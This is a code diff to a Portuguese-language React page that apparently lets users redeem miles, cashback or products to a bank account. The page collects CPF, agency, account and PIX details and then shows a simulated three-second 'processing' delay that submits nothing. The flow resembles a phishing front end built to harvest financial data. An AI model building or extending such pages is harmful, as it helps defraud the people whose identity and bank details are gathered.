@@ -1,4 +1,4 @@
-import { useState, useCallback } from "react";
+import { useState, useCallback, useEffect } from "react";
 import { useLocation, useSearch } from "wouter";
 import { ArrowLeft, Building2, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
@@ -16,13 +16,6 @@ const bancos = [
   { id: "caixa", nome: "Caixa", cor: "#005CA9" },
 ];
 
-function formatCpf(value: string) {
-  const digits = value.replace(/\D/g, "").slice(0, 11);
-  if (digits.length <= 3) return digits;
-  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
-  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
-  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
-}
 
 export default function Banco() {
   const [, setLocation] = useLocation();
@@ -33,11 +26,20 @@ export default function Banco() {
   const [bancoSelecionado, setBancoSelecionado] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  const [nome, setNome] = useState("");
-  const [cpf, setCpf] = useState("");
+  const savedNome = localStorage.getItem("nomeUsuario") || "";
+  const savedCpf = localStorage.getItem("cpfUsuario") || "";
+
+  const [nome] = useState(savedNome);
+  const [cpf] = useState(savedCpf);
   const [agencia, setAgencia] = useState("");
   const [conta, setConta] = useState("");
   const [pix, setPix] = useState("");
+
+  useEffect(() => {
+    if (!localStorage.getItem("cpfUsuario")) {
+      setLocation("/");
+    }
+  }, [setLocation]);
 
   const tipoLabel = tipo === "milhas" ? "Milhas Aereas" : tipo === "cashback" ? "Cashback" : "Produtos do Site";
 
@@ -46,13 +48,13 @@ export default function Banco() {
   }, []);
 
   const handleEnviar = useCallback(() => {
-    if (!nome.trim() || !cpf.trim() || !pix.trim()) return;
+    if (!pix.trim()) return;
     setLoading(true);
     setTimeout(() => {
       setLoading(false);
       setLocation(`/confirmacao?tipo=${tipo}&banco=${bancoSelecionado}`);
     }, 3000);
-  }, [nome, cpf, pix, tipo, bancoSelecionado, setLocation]);
+  }, [pix, tipo, bancoSelecionado, setLocation]);
 
   const bancoNome = bancos.find(b => b.id === bancoSelecionado)?.nome || "";
 
@@ -129,9 +131,8 @@ export default function Banco() {
                   <input
                     type="text"
                     value={nome}
-                    onChange={(e) => setNome(e.target.value)}
-                    placeholder="Digite seu nome completo"
-                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
+                    readOnly
+                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-[#F6F6F6] text-sm text-[#222] cursor-not-allowed"
                     data-testid="input-nome"
                   />
                 </div>
@@ -141,10 +142,8 @@ export default function Banco() {
                   <input
                     type="text"
                     value={cpf}
-                    onChange={(e) => setCpf(formatCpf(e.target.value))}
-                    placeholder="000.000.000-00"
-                    maxLength={14}
-                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-white text-sm text-[#222] focus:outline-none focus:ring-2 focus:ring-[#EC008C]/30 focus:border-[#EC008C] transition-colors"
+                    readOnly
+                    className="w-full px-4 py-3 rounded-xl border border-[#E5E5E5] bg-[#F6F6F6] text-sm text-[#222] cursor-not-allowed"
                     data-testid="input-cpf-banco"
                   />
                 </div>
@@ -188,7 +187,7 @@ export default function Banco() {
 
                 <Button
                   onClick={handleEnviar}
-                  disabled={!nome.trim() || !cpf.trim() || !pix.trim()}
+                  disabled={!pix.trim()}
                   className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mt-2 disabled:opacity-50"
                   data-testid="button-enviar"
                 >
